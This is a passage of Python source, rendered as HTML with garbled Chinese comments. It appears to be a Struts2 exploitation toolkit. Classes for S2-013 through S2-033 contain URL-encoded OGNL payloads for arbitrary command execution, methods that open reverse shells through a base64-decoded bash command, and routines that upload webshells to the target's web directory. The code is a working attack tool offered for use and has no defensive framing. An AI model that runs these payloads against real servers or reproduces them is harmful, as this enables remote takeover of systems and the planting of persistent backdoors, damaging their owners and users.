&#x27;S2-013&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.web_path), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&#123;t&#125;&amp;f=&#123;f&#125;&quot;.format(t=quote(shell), f=upload_path)</span><br><span class="line">        html = post(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.upload_paylaod), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_015:</span><br><span class="line">    &quot;&quot;&quot;S2-015æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-015:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B%23context%5B&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())%2C%23q%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&quot;.action&quot;):</span><br><span class="line">            rindex = url.rindex(&#x27;/&#x27;)</span><br><span class="line">            self.url = url[:rindex + 1]</span><br><span class="line">        elif url.endswith(&quot;/&quot;):</span><br><span class="line">            self.url = url</span><br><span class="line">        else:</span><br><span class="line">            self.url = url + &#x27;/&#x27;</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-015&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &quot;&#123;payload&#125;.action&quot;.format(payload=payload), self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&#x27;ERROR:&#x27;):</span><br><span class="line">            return html</span><br><span class="line">        try:</span><br><span class="line">            soup = BeautifulSoup(html, &#x27;lxml&#x27;)</span><br><span class="line">            ps = soup.find_all(&#x27;p&#x27;)</span><br><span class="line">            result = unquote(ps[1].text[9:-4]).strip()</span><br><span class="line">            return result</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_016:</span><br><span class="line">    &quot;&quot;&quot;S2-016æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-016:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    check_poc = &quot;redirect%3A%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;redirect:$%7B%23a%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload1 = &quot;redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D&quot;</span><br><span class="line">    exec_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22&#123;cmd&#125;%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    exec_payload3 = r&quot;redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;&quot;</span><br><span class="line">    upload_payload1 = r&quot;&quot;&quot;redirect:$&#123;%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()&#125;&amp;t=SHELL&quot;&quot;&quot;</span><br><span class="line">    upload_payload2 = &quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22&#123;path&#125;%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        self.exec_dict = &#123;&quot;payload1&quot;: self.exec_cmd1, &quot;payload2&quot;: self.exec_cmd2, &quot;payload3&quot;: self.exec_cmd3&#125;</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + poc, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            self.select_exec()</span><br><span class="line">            return &#x27;S2-016&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def echo_check(self, exec_fun):</span><br><span class="line">        &quot;&quot;&quot;é€šè¿‡echoè¾“å‡ºæ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        html = exec_fun(&quot;echo &quot; + hash_str)</span><br><span class="line">        if hash_str in html:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def select_exec(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©åˆé€‚çš„æ‰§è¡Œå‘½ä»¤çš„exp&quot;&quot;&quot;</span><br><span class="line">        result = self.echo_check(self.exec_cmd1)</span><br><span class="line">        if result:</span><br><span class="line">            self.exec_payload = &quot;payload1&quot;</span><br><span class="line">        else:</span><br><span class="line">            result = self.echo_check(self.exec_cmd2)</span><br><span class="line">            if result:</span><br><span class="line">                self.exec_payload = &quot;payload2&quot;</span><br><span class="line">            else:</span><br><span class="line">                result = self.echo_check(self.exec_cmd3)</span><br><span class="line">                if result:</span><br><span class="line">                    self.exec_payload = &quot;payload3&quot;</span><br><span class="line">                else:</span><br><span class="line">                    self.exec_payload = &quot;None&quot;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        if self.exec_payload not in self.exec_dict:</span><br><span class="line">            # print(&quot;[+] æœ¬ç¨‹åºS2_016é¢„è®¾EXPå¯¹ &#123;url&#125; æ— æ•ˆ!&quot;.format(url=self.url))</span><br><span class="line">            return None</span><br><span class="line">        result = self.exec_dict.get(self.exec_payload)(cmd)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def exec_cmd1(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload1.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd2(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload2.format(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd3(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?&quot; + self.exec_payload3.replace(&#x27;CMD&#x27;, quote(cmd)).replace(&#x27;ENCODING&#x27;, self.encoding),</span><br><span class="line">                   self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell1(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload1.replace(&#x27;PATH&#x27;, quote(upload_path)).replace(&#x27;SHELL&#x27;, quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell2(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;t=&quot; + quote(shell)</span><br><span class="line">        web_path = self.get_path()</span><br><span class="line">        upload_path = upload_path.replace(web_path, &#x27;&#x27;)</span><br><span class="line">        html = post(self.url + &#x27;?&#x27; + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        result = self.upload_shell1(upload_path, shell_path)</span><br><span class="line">        if not result:</span><br><span class="line">            result = self.upload_shell2(upload_path, shell_path)</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_019:</span><br><span class="line">    &quot;&quot;&quot;S2-019æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-019:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%23req%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;)%2C%23resp%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23resp.setCharacterEncoding(&#x27;&#123;encoding&#125;&#x27;)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(&#x27;%2F&#x27;))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()&quot;</span><br><span class="line">    exec_payload = &quot;%23f%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;debug=command&amp;expression=%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22&#123;path&#125;%22)).append(%23req.getParameter(%22shell%22)).close()&amp;shell=&#123;shell&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-019&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(</span><br><span class="line">            payload=self.web_path.format(encoding=self.encoding)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(</span><br><span class="line">            self.url + &quot;?debug=command&amp;expression=&#123;payload&#125;&quot;.format(payload=self.exec_payload.format(cmd=quote(cmd))),</span><br><span class="line">            self.headers,</span><br><span class="line">            self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload.format(path=quote(upload_path), shell=quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_029:</span><br><span class="line">    &quot;&quot;&quot;S2-029æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-029:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.24.1(é™¤äº†2.3.20.3); POSTè¯·æ±‚å‘é€æ•°æ®,éœ€è¦å‚æ•°; é»˜è®¤å‚æ•°:message; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23_memberAccess%5B&#x27;allowPrivateAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;excludedPackageNamePatterns&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;excludedClasses&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;allowPackageProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowStaticMethodAccess&#x27;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;message=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-029&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_032:</span><br><span class="line">    &quot;&quot;&quot;S2-032æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-032:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    web_path = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=&#123;encoding&#125;&quot;</span><br><span class="line">    exec_payload = &quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=&#123;encoding&#125;&amp;cmd=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;é€‰æ‹©å¯ä»¥åˆ©ç”¨æˆåŠŸçš„payload&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &quot;1008660253718&quot;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-032&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path.format(encoding=self.encoding), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), encoding=self.encoding)</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_033:</span><br><span class="line">    &quot;&quot;&quot;S2-033æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-033:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span><br><span class="line">    exec_payload = &quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        if url.endswith(&#x27;/&#x27;):</span><br><span class="line">            self.url = 